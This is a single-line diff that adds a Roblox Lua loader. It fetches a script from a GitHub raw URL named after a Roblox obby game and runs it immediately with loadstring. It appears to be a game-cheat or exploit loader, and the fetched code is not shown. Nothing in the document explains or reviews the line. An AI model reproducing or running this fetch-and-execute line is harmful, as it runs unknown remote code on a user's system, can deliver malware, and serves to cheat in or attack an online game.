@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/1-2-player-grapple-cart-obby-spam7-zfo7zd0tghr2ch.lua"))()
